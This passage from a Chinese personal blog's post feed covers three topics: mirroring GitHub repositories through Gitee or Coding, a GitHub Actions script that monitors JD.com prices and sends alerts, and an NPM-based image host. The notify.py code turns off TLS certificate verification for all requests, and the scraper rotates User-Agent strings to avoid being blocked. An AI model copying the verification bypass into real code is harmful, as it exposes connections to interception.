列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> 